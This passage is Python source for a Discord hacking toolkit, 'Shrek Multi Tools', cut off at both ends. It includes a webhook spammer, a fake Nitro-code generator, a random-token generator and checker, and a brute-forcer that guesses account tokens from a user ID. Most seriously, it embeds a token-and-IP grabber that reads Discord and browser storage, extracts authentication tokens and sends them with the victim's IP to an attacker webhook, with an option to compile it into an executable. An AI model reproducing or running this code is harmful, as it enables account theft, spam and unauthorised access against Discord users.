                      "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
                  }
                  url1 = f'https://discord.com/api/v9/webhooks/{ids[i]}'
                  t = requests.patch(url1,headers=header2,json={'avatar':url2})
                  print("Succefully changed the avatar to a *Shrek* for the Webhooks!")

                  link = []

                  for t in range(length):
                      url3 = f'https://discord.com/api/webhooks/{ids[t]}/{token[t]}'
                      link.append(url3)

                  for x in range(5):
                      r = requests.post(url3, headers=header, json={'content':msg})
                      if r.status_code == 200 or 204:
                          print(f'Successfully sent {msg} to the chat')

      threads = []
      for x in range(10):
          t = threading.Thread(target=spammer)
          t.daemon = True
          t.start()
          threads.append(t)

      for thread in threads:
          t.join()

    elif options2 in ['0','00']:
      tool()
      return
    else:
      print('Invalid Option')

    while __name__ == '__main__' and options2 not in ['0','00']:
      print(Fore.WHITE)
      os.system('pause')
      webhooks()

  def nitro():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Nitro Generator")
    colorama.init()

    print(f'''
{Fore.GREEN}
 ███▄    █   ██▄▄▄█████▓ ██▀███   ▒█████     ▄████ ▓█████ ███▄    █ 
 ██ ▀█   █ ▒▓██▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▒ ██▒ ▀█▒▓█   ▀ ██ ▀█   █ 
▓██  ▀█ ██▒░▒██▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒░▒██░▄▄▄░▒███  ▓██  ▀█ ██▒
▓██▒  ▐▌██▒ ░██░ ▓██▓ ░ ▒██▀▀█▄  ▒██   ██░░░▓█  ██▓▒▓█  ▄▓██▒  ▐▌██▒
▒██░   ▓██░ ░██  ▒██▒ ░ ░██▓ ▒██▒░ ████▓▒░░▒▓███▀▒░░▒████▒██░   ▓██░
░ ▒░   ▒ ▒  ░▓   ▒ ░░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░  ░▒   ▒  ░░ ▒░ ░ ▒░   ▒ ▒ 
░ ░░   ░ ▒░  ▒     ░      ░▒ ░ ▒░  ░ ▒ ▒░   ░   ░   ░ ░  ░ ░░   ░ ▒░
   ░   ░ ░   ▒   ░ ░       ░   ░ ░ ░ ░ ▒  ░ ░   ░ ░   ░     ░   ░ ░ 
         ░   ░             ░         ░ ░        ░     ░           ░ 

      ''')



    webhooklink = str(input(f"""{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Webhook URL: """))
    
    count = 0

    webhook = "~~WEBHOOK_URL~~""".replace("~~WEBHOOK_URL~~", webhooklink)

    while True:
        try:
            code = ''.join(random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(24))
            post = {"content":"https://discord.com/billing/promotions/"+code}
            head = {

                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", 
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
                    'content-type' : 'application/json'
                }
            count += 1
            print(f'{Fore.GREEN}[{g}{Fore.WHITE}>{Fore.RESET}{Fore.GREEN}] {Fore.WHITE}Generated Nitro | [{count}]')
            s = requests.post(webhook, json=post, headers=head)
        except:
            print(f"[{r}!{Fore.RESET}] ERROR!")
            break

  global proxyscrape
  def proxyscrape():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Proxy Scraper")
    print(Fore.GREEN + '''

 ██▓███   ██▀███   ▒█████  ▒██   ██▒▓██   ██▓      ██████   ▄████▄  ██▀███   ▄▄▄      ██▓███   ▓█████ ██▀███  
▓██░  ██ ▓██ ▒ ██▒▒██▒  ██▒▒▒ █ █ ▒░ ▒██  ██▒    ▒██    ▒  ▒██▀ ▀█ ▓██ ▒ ██▒▒████▄   ▓██░  ██  ▓█   ▀▓██ ▒ ██▒
▓██░ ██▓▒▓██ ░▄█ ▒▒██░  ██▒░░  █   ░  ▒██ ██░    ░ ▓██▄    ▒▓█    ▄▓██ ░▄█ ▒▒██  ▀█▄ ▓██░ ██▓▒ ▒███  ▓██ ░▄█ ▒
▒██▄█▓▒ ▒▒██▀▀█▄  ▒██   ██░ ░ █ █ ▒   ░ ▐██▓░      ▒   ██▒▒▒▓▓▄ ▄██▒██▀▀█▄  ░██▄▄▄▄██▒██▄█▓▒ ▒ ▒▓█  ▄▒██▀▀█▄  
▒██▒ ░  ░░██▓ ▒██▒░ ████▓▒░▒██▒ ▒██▒  ░ ██▒▓░    ▒██████▒▒░▒ ▓███▀ ░██▓ ▒██▒▒▓█   ▓██▒██▒ ░  ░▒░▒████░██▓ ▒██▒
▒▓▒░ ░  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒▒ ░ ░▓ ░   ██▒▒▒     ▒ ▒▓▒ ▒ ░░░ ░▒ ▒  ░ ▒▓ ░▒▓░░▒▒   ▓▒█▒▓▒░ ░  ░░░░ ▒░ ░ ▒▓ ░▒▓░
░▒ ░       ░▒ ░ ▒   ░ ▒ ▒░ ░░   ░▒ ░ ▓██ ░▒░     ░ ░▒  ░     ░  ▒    ░▒ ░ ▒ ░ ░   ▒▒ ░▒ ░     ░ ░ ░    ░▒ ░ ▒ 
░░         ░░   ░ ░ ░ ░ ▒   ░    ░   ▒ ▒ ░░      ░  ░  ░   ░         ░░   ░   ░   ▒  ░░           ░    ░░   ░ 
            ░         ░ ░   ░    ░   ░ ░               ░   ░ ░        ░           ░           ░   ░     ░     


    ''')
    typeproxy = int(input(f"""
{Fore.GREEN}[{Fore.WHITE}1{Fore.GREEN}] {Fore.WHITE}Http/Https
{Fore.GREEN}[{Fore.WHITE}2{Fore.GREEN}] {Fore.WHITE}Socks4
{Fore.GREEN}[{Fore.WHITE}3{Fore.GREEN}] {Fore.WHITE}Socks5

   {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE}"""))
    if typeproxy == 1:
      out_file = "Https Proxies.txt"
      proxies = open(out_file,'ab')
      r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt')
      r2 = requests.get('https://api.openproxylist.xyz/http.txt')
      proxies.write(r1.content)
      proxies.write(r2.content)
      num = 0
      for lines in r1.iter_lines():
        num += 1
      num2 = 0
      for lines in r2.iter_lines():
        num2 += 1
      length1 = num2 + num
      print(Fore.WHITE + f"   Done! Successfully added {length1} proxies, Check where this file is located.")
      proxies.close()

    elif typeproxy == 2:
      out_file = "Socks4 Proxies.txt"
      proxies = open(out_file,'wb')
      r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt')
      r2 = requests.get('https://api.openproxylist.xyz/socks4.txt')
      proxies.write(r1.content)
      proxies.write(r2.content)
      num = 0
      for lines in r1.iter_lines():
        num += 1
      num2 = 0
      for lines in r2.iter_lines():
        num2 += 1
      length1 = num2 + num
      print(Fore.WHITE + f"   Done! Successfully added {length1} proxies, Check where this file is located.")
      proxies.close()

    elif typeproxy == 3:
      r1 = requests.get('https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt')
      r2 = requests.get('https://api.openproxylist.xyz/socks5.txt')
      out_file = "Socks5 Proxies.txt"
      proxies = open(out_file,'wb')
      proxies.write(r1.content)
      proxies.write(r2.content)
      num = 0
      for lines in r1.iter_lines():
        num += 1
      num2 = 0
      for lines in r2.iter_lines():
        num2 += 1
      length1 = num2 + num
      print(Fore.WHITE + f"   Done! Successfully added {length1} proxies, Check where this file is located.")
      proxies.close()
    else:
      print("Invalid Option")

  global tokengen
  def tokengen():

    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token Generator")
    print(f"""
{Fore.GREEN}
████████▓ ▒█████   ██ ▄█▀ ▓█████ ███▄    █        ▄████ ▓█████ ███▄    █ 
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▓█   ▀ ██ ▀█   █     ▒ ██▒ ▀█▒▓█   ▀ ██ ▀█   █ 
▒ ▓██░ ▒░▒██░  ██▒▓███▄░  ▒███  ▓██  ▀█ ██▒    ░▒██░▄▄▄░▒███  ▓██  ▀█ ██▒
░ ▓██▓ ░ ▒██   ██░▓██ █▄  ▒▓█  ▄▓██▒  ▐▌██▒    ░░▓█  ██▓▒▓█  ▄▓██▒  ▐▌██▒
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄▒░▒████▒██░   ▓██░    ░▒▓███▀▒░░▒████▒██░   ▓██░
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒░   ▒ ▒      ░▒   ▒  ░░ ▒░ ░ ▒░   ▒ ▒ 
    ░      ░ ▒ ▒░ ░ ░▒ ▒░░ ░ ░  ░ ░░   ░ ▒░      ░   ░   ░ ░  ░ ░░   ░ ▒░
  ░      ░ ░ ░ ▒  ░ ░░ ░     ░     ░   ░ ░     ░ ░   ░ ░   ░     ░   ░ ░ 
             ░ ░  ░  ░   ░   ░           ░           ░     ░           ░ 


    """)

    howmany111 = int(input(f"""{Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}] {Fore.WHITE}How many tokens to generate: """))

    fileask = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Do you want to output to a text file?: ''').lower()


    chars = string.ascii_letters + string.digits

    if fileask in yeslist:
      token = []
      for i in range(howmany111):
        a = "".join(random.choice(chars) for x in range(20))
        b = "".join(random.choice(chars) for x in range(6))
        c = "".join(random.choice(chars) for x in range(27))

        result = "OTIw" + a + '.' + b + '.' + c
        file = open("gennedTokens.txt", 'a')
        file.write(result + '\n')
        token.append(result)
      print(Fore.WHITE + "All tokens are random characters.")

      checktoken = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Do you want to check the tokens?: ''')
      if checktoken in yeslist:
        with open('gennedTokens.txt','a') as tokenfile:
          valid = 0
          invalid = 0
          for x in range(len(token)):
            header = {
              "authority": "discord.com",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{token[x]}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
              } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.GREEN}[+] Valid {token[x]}' )
                valid += 1
                tokenfile.write(token[x] + '\n')
            else:
                print(f'\033[31m[-] Invalid {token[x]}', )
                invalid += 1

          print(f'{Fore.WHITE}There are {valid} valid tokens and {invalid} invalid tokens')
      print(Fore.GREEN + "Finished! Check where the file is located.")
      file.close() 

    elif fileask in nolist:
      token = []
      for i in range(howmany111):
        a = "".join(random.choice(chars) for x in range(20))
        b = "".join(random.choice(chars) for x in range(6))
        c = "".join(random.choice(chars) for x in range(27))


        tokens = "OTIw" + a + "." + b + "." + c
        token.append(tokens)
        print(Fore.WHITE + tokens)
      print(Fore.WHITE + "All tokens are random characters.")
      checktoken = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Do you want to check the tokens?: ''')
      if checktoken in yeslist:
        with open('gennedTokens.txt','a') as tokenfile:
          valid = 0
          invalid = 0
          for x in range(len(token)):
            header = {
              "authority": "discord.com",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{token[x]}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
              } 
            r = requests.get('https://discordapp.com/api/v9/users/@me/library', headers = header)  
            if r.status_code == 200:
                print(f'{Fore.WHITE} [+] Valid {token[x]}' )
                valid += 1
            else:
                print(f'\033[31m [-] Invalid {token[x]}', )
                invalid += 1

          print(f'{Fore.WHITE} There are {valid} valid tokens and {invalid} invalid tokens')

    else:
      print("Invalid Option")

  def login():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token Login") 
    print(f'''
{Fore.GREEN}
████████▓ ▒█████   ██ ▄█▀ ▓█████ ███▄    █       ██▓    ▒█████   ▄████   ██▓ ███▄    █     
▓  ██▒ ▓▒▒██▒  ██▒ ██▄█▒  ▓█   ▀ ██ ▀█   █      ▓██▒   ▒██▒  ██▒ ██▒ ▀█▒▓██▒ ██ ▀█   █     
▒ ▓██░ ▒░▒██░  ██▒▓███▄░  ▒███  ▓██  ▀█ ██▒     ▒██░   ▒██░  ██▒▒██░▄▄▄▒▒██▒▓██  ▀█ ██▒    
░ ▓██▓ ░ ▒██   ██░▓██ █▄  ▒▓█  ▄▓██▒  ▐▌██▒     ▒██░   ▒██   ██░░▓█  ██░░██░▓██▒  ▐▌██▒    
  ▒██▒ ░ ░ ████▓▒░▒██▒ █▄▒░▒████▒██░   ▓██░    ▒░██████░ ████▓▒░▒▓███▀▒░░██░▒██░   ▓██░    
  ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░░ ▒░ ░ ▒░   ▒ ▒     ░░ ▒░▓  ░ ▒░▒░▒░ ░▒   ▒  ░▓  ░ ▒░   ▒ ▒     
    ░      ░ ▒ ▒░ ░ ░▒ ▒░░ ░ ░  ░ ░░   ░ ▒░    ░░ ░ ▒    ░ ▒ ▒░  ░   ░ ░ ▒ ░░ ░░   ░ ▒░    
  ░      ░ ░ ░ ▒  ░ ░░ ░     ░     ░   ░ ░        ░ ░  ░ ░ ░ ▒   ░   ░ ░ ▒ ░   ░   ░ ░     
             ░ ░  ░  ░   ░   ░           ░     ░    ░      ░ ░       ░   ░           ░     


  {Fore.WHITE}                 
    ''')

    token = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the token you want to log in with?: ''')
    directory = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}What is the directory with your chrome driver (Check inside of this folder): ''')

    chromedriver = f'{directory}/chromedriver.exe'

    driver = webdriver.Chrome(chromedriver)

    driver.set_window_size(1800,1800)

    URL = 'https://discord.com/login/'
    driver.get(URL)


    message = '''
    function login(token) {
    setInterval(() => {
    document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
    }, 50);
    setTimeout(() => {
    location.reload();
    }, 2500);
    }

    login("''' + token + '''")
    '''
    driver.execute_script(message)

    time.sleep(10)
    cls()
    print('To close the browser')
    os.system('pause')

  def discordserver():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Shrek™ Support")
    print(f'''
{Fore.GREEN}
    ██████   ██░ ██  ██▀███  ▓█████ ▀██ ▄█▀    ▄▄▄█████▓  ███▄ ▄███▓    
  ▒██    ▒ ▒▓██░ ██ ▓██ ▒ ██▒▓█   ▀  ██▄█▒     ▓  ██▒ ▓▒ ▓██▒▀█▀ ██▒    
  ░ ▓██▄   ░▒██▀▀██ ▓██ ░▄█ ▒▒███   ▓███▄░     ▒ ▓██░ ▒░ ▓██    ▓██░    
    ▒   ██▒ ░▓█ ░██ ▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄     ░ ▓██▓ ░  ▒██    ▒██     
  ▒██████▒▒ ░▓█▒░██▓░██▓ ▒██▒░▒████ ▒██▒ █▄      ▒██▒ ░ ▒▒██▒   ░██▒    
  ▒ ▒▓▒ ▒ ░  ▒ ░░▒░▒░ ▒▓ ░▒▓░░░ ▒░  ▒ ▒▒ ▓▒      ▒ ░░   ░░ ▒░   ░  ░    
  ░ ░▒  ░    ▒ ░▒░ ░  ░▒ ░ ▒░ ░ ░   ░ ░▒ ▒░        ░    ░░  ░      ░    
  ░  ░  ░    ░  ░░ ░   ░   ░    ░   ░ ░░ ░       ░ ░     ░      ░       
        ░    ░  ░  ░   ░        ░   ░  ░                ░       ░       


    ''')  
    whichserver = int(input(f"""
  {Fore.GREEN}[{Fore.WHITE}1{Fore.GREEN}] {Fore.WHITE}Shrek™ Discord server
  {Fore.GREEN}[{Fore.WHITE}2{Fore.GREEN}] {Fore.WHITE}Shrek™ Github
  {Fore.GREEN}[{Fore.WHITE}3{Fore.GREEN}] {Fore.WHITE}Shrek™ Founder  
  {Fore.GREEN}[{Fore.WHITE}0{Fore.GREEN}] EXIT


  {Fore.GREEN}[{Fore.WHITE}>{Fore.GREEN}]{Fore.WHITE}"""))


    if whichserver == 1:
      webbrowser.open('https://discord.gg/JKsRYZ244U')
    elif whichserver == 2:
      webbrowser.open('https://github.com/SHREK-TM/Shrek-Tools')
    elif whichserver == 3:
      print(f'''
{Fore.GREEN}
    ██████   ██░ ██  ██▀███  ▓█████ ▀██ ▄█▀    ▄▄▄█████▓  ███▄ ▄███▓    
  ▒██    ▒ ▒▓██░ ██ ▓██ ▒ ██▒▓█   ▀  ██▄█▒     ▓  ██▒ ▓▒ ▓██▒▀█▀ ██▒    
  ░ ▓██▄   ░▒██▀▀██ ▓██ ░▄█ ▒▒███   ▓███▄░     ▒ ▓██░ ▒░ ▓██    ▓██░    
    ▒   ██▒ ░▓█ ░██ ▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄     ░ ▓██▓ ░  ▒██    ▒██     
  ▒██████▒▒ ░▓█▒░██▓░██▓ ▒██▒░▒████ ▒██▒ █▄      ▒██▒ ░ ▒▒██▒   ░██▒    
  ▒ ▒▓▒ ▒ ░  ▒ ░░▒░▒░ ▒▓ ░▒▓░░░ ▒░  ▒ ▒▒ ▓▒      ▒ ░░   ░░ ▒░   ░  ░    
  ░ ░▒  ░    ▒ ░▒░ ░  ░▒ ░ ▒░ ░ ░   ░ ░▒ ▒░        ░    ░░  ░      ░    
  ░  ░  ░    ░  ░░ ░   ░   ░    ░   ░ ░░ ░       ░ ░     ░      ░       
        ░    ░  ░  ░   ░        ░   ░  ░                ░       ░       


    ''')  
      print(f'''{Fore.GREEN} Github: {Fore.WHITE}https://github.com/SHREK-TM''')
      print(f'''{Fore.GREEN} Discors: {Fore.WHITE}neyrox_space ''')
      os.system("pause")
      tool()
      return
    elif whichserver == 0:
      tool()
      return
    else:
      print("Invalid Option.")

  global grabber
  def grabber():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token & Ip Grabber") 
      print(f'''
{Fore.GREEN}
 ▄████  ██▀███   ▄▄▄      ▄▄▄▄    ▄▄▄▄    ▓█████ ██▀███  
 ██▒ ▀█▓██ ▒ ██▒▒████▄   ▓█████▄ ▓█████▄  ▓█   ▀▓██ ▒ ██▒
▒██░▄▄▄▓██ ░▄█ ▒▒██  ▀█▄ ▒██▒ ▄██▒██▒ ▄██ ▒███  ▓██ ░▄█ ▒
░▓█  ██▒██▀▀█▄  ░██▄▄▄▄██▒██░█▀  ▒██░█▀   ▒▓█  ▄▒██▀▀█▄  
▒▓███▀▒░██▓ ▒██▒▒▓█   ▓██░▓█  ▀█▓░▓█  ▀█▓▒░▒████░██▓ ▒██▒
░▒   ▒ ░ ▒▓ ░▒▓░░▒▒   ▓▒█░▒▓███▀▒░▒▓███▀▒░░░ ▒░ ░ ▒▓ ░▒▓░
 ░   ░   ░▒ ░ ▒ ░ ░   ▒▒ ▒░▒   ░ ▒░▒   ░ ░ ░ ░    ░▒ ░ ▒ 
 ░   ░   ░░   ░   ░   ▒   ░    ░  ░    ░     ░    ░░   ░ 
     ░    ░           ░   ░       ░      ░   ░     ░     
''')
      filename = filename.replace('.py', '')

      file = open(filename + '.py','w')
      grabbingcode = '''
import os
import requests
from re import findall
from json import loads, dumps
from urllib.request import Request, urlopen
web1 = '""" + hooklink + """'
lc = os.getenv("LOCALAPPDATA")
rm = os.getenv("APPDATA")
PATHS = {
    "Discord": rm + "\\\\Discord",
    "Discord Canary": rm + "\\\\discordcanary",
    "Discord PTB": rm + "\\\\discordptb",
    "Google Chrome": lc + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera": rm + "\\\\Opera Software\\\\Opera Stable"
}
def header(token=None):
    headers = {
        "Content-Type": "application/json",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def da(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v9/users/@me", headers=header(token))).read().decode())
    except:
        pass
def tukan(path):
    path += "\\\\Local Storage\\\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def grabber():
    em = []
    em1 = []
    checked = []
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in tukan(path):
            if token in checked:
                continue
            checked.append(token)
            user_data = da(token)
            if not user_data:
                continue
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            emb = {
                "fields": [
                        {
                            "name": "Token",
                            "value": token,
                            "inline": False
                        }
                ],
                "author": {
                    "name": f"{username} ",
                },
            }
            em.append(emb)

    ip = requests.get('https://api.ipify.org?format=json')
    global ipv4
    ipv4 = ip.json()["ip"]
    emb1 = {
    "fields": [
            {
                "name": "IP",
                "value": ipv4,
                "inline": False
            }
    ],
    "author": {
        "name": "Shrek Multi Tool",
        },
    }
    em1.append(emb1)


    webhook = {
        "content": "",
        "embeds": em,
        "username": "TOKENS DROP"
    }

    webhook1 = {
        "content": "",
        "embeds": em1,
        "username": "IP"
    }

    try:
        urlopen(Request(web1, data=dumps(webhook).encode(), headers=header()))
        urlopen(Request(web1, data=dumps(webhook1).encode(), headers=header()))
    except:
        pass
if __name__ == '__main__':
    grabber()
    '''
      file.write(grabbingcode)
      file.flush()
      file.close()
      print('Done!')
      exe = input(f'''{Fore.GREEN}[{Fore.WHITE}+{Fore.GREEN}] {Fore.WHITE}Do you want to make the grabber an exe?: ''')
      exename = filename + '.py'
      if exe in yeslist:
        os.system(f'pyinstaller --onefile -i NONE {exename}')
        cls()
        print(f'{Fore.RESET}Done! Look Inside of the new folder named {Fore.GREEN} DIST {Fore.RESET} to find {filename}.exe')

  global bruteforce
  def bruteforce():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Token bruteforcer")
    print(f'''
{Fore.GREEN}
 ▄▄▄▄    ██▀███   █    ██ ▄▄▄█████▓ ▓█████ ▒ ████▒ ▒█████   ██▀███    ▄████▄  ▓█████ ██▀███  
▓█████▄ ▓██ ▒ ██▒ ██  ▓██▒▓  ██▒ ▓▒ ▓█   ▀▒▓██    ▒██▒  ██▒▓██ ▒ ██▒ ▒██▀ ▀█  ▓█   ▀▓██ ▒ ██▒
▒██▒ ▄██▓██ ░▄█ ▒▓██  ▒██░▒ ▓██░ ▒░ ▒███  ░▒████  ▒██░  ██▒▓██ ░▄█ ▒ ▒▓█    ▄ ▒███  ▓██ ░▄█ ▒
▒██░█▀  ▒██▀▀█▄  ▓▓█  ░██░░ ▓██▓ ░  ▒▓█  ▄░░▓█▒   ▒██   ██░▒██▀▀█▄  ▒▒▓▓▄ ▄██ ▒▓█  ▄▒██▀▀█▄  
░▓█  ▀█▓░██▓ ▒██▒▒▒█████▓   ▒██▒ ░ ▒░▒████ ░▒█░   ░ ████▓▒░░██▓ ▒██▒░▒ ▓███▀ ▒░▒████░██▓ ▒██▒
░▒▓███▀▒░ ▒▓ ░▒▓░░▒▓▒ ▒ ▒   ▒ ░░   ░░░ ▒░   ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░░ ░▒ ▒  ░░░ ▒░ ░ ▒▓ ░▒▓░
▒░▒   ░   ░▒ ░ ▒ ░░▒░ ░ ░     ░    ░ ░ ░    ░       ░ ▒ ▒░   ░▒ ░ ▒    ░  ▒  ░ ░ ░    ░▒ ░ ▒ 
 ░    ░   ░░   ░  ░░░ ░ ░   ░          ░    ░ ░   ░ ░ ░ ▒    ░░   ░  ░           ░    ░░   ░ 
 ░         ░        ░              ░   ░              ░ ░     ░      ░ ░     ░   ░     ░     




{Fore.WHITE} If it stops just click Enter on your keyboard
{Fore.GREEN}                                                    
    ''')
    global id_to_token
    id_to_token = base64.b64encode((input(" What is the User's ID?: ")).encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]

    def bruting():
      while True:
        pyautogui.press('enter')
        time.sleep(0.05)
        token = id_to_token + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '.' + ''.join(random.choices(string.ascii_letters + string.digits, k=25))
        headers={
          'Authorization': token
        }
        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headers)
        try:
          if login.status_code == 200:
            print('\033[32' + ' [+] VALID' + ' ' + token)
            f = open('VALID.txt', "a+")
            f.write(f'{token}\n')
            break
          else:
            print('[-] INVALID' + ' ' + token) 
        finally:
          print("")
        input()

    threads = []
    for i in range(3):
      t = threading.Thread(target=bruting)
      t.daemon = True
      t.start()
      threads.append(t)

    for threads in threads:
      t.join()

  def hypesquad():
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Shrek Multi Tools | Hypesquad Changer")
    url = 'https://discord.com/api/v9/hypesquad/online'

    house = int(input(f"""
    {Fore.GREEN}
  ██░ ██ ▓██   ██▓ ██▓███   ▓█████ ██▀███    ██████   █████   █    ██  ▄▄▄     ▓█████▄ 
▒▓██░ ██  ▒██  ██▒▓██░  ██  ▓█   ▀▓██ ▒ ██▒▒██    ▒ ▒██▓  ██▒ ██  ▓██▒▒████▄   ▒██▀ ██▌
░▒██▀▀██   ▒██ ██░▓██░ ██▓▒ ▒███  ▓██ ░▄█ ▒░ ▓██▄   ▒██▒  ██░▓██  ▒██░▒██  ▀█▄ ░██   █▌
 ░▓█ ░██   ░ ▐██▓░▒██▄█▓▒ ▒ ▒▓█  ▄▒██▀▀█▄    ▒   ██▒░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██░▓█▄   ▌
 ░▓█▒░██▓  ░ ██▒▓░▒██▒ ░  ░▒░▒████░██▓ ▒██▒▒██████▒▒░▒███▒█▄ ▒▒█████▓ ▒▓█   ▓██░▒████▓ 
